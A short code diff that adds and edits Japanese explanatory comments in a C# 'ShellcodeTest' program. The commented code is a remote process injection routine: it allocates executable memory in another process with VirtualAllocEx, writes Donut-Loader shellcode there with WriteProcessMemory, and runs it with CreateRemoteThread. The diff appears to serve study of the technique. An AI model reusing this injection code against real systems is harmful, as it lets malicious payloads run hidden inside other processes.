@@ -361,12 +361,13 @@ namespace ShellcodeTest
 			// checkedステートメントで整数型の算術演算および変換に対するオーバーフローをチェックし、ステートメント内のコードを例外処理できるようにする
 			checked
 			{
-				// WIndowsAPIの「VirtualAllocEx」で指定したプロセスIDのプロセスにメモリを割り当てる
+				// WIndowsAPIの「VirtualAllocEx」で、指定したプロセスIDのプロセスに新しいメモリを割り当てる
 				// 12288Uは整数リテラルなので、uint型の12288。12288は16進数で「0x3000」であり「MEM_COMMIT」「MEM_RESERVE」をあらわす
 				IntPtr intPtr2 = Program.VirtualAllocEx(intPtr, IntPtr.Zero, (uint)array.Length, 12288U, 64U);
 				UIntPtr uintPtr;
-				// WindowsAPIの「WriteProcessMemory」でVirtualAllocEXで作成したメモリ内に、「Donut-Loader」で指定したShellCodeが書き込まれる
+				// WindowsAPIの「WriteProcessMemory」で、VirtualAllocEXで作成したメモリ内に「Donut-Loader」で指定したShellCodeが書き込まれる
 				Program.WriteProcessMemory(intPtr, intPtr2, array, (uint)array.Length, out uintPtr);
+				// WindowsAPIの「CerateRemoteTyread」で、ShellCodeを実行
 				Program.CreateRemoteThread(intPtr, IntPtr.Zero, 0U, intPtr2, IntPtr.Zero, 0U, IntPtr.Zero);
 				return 0;
 			}
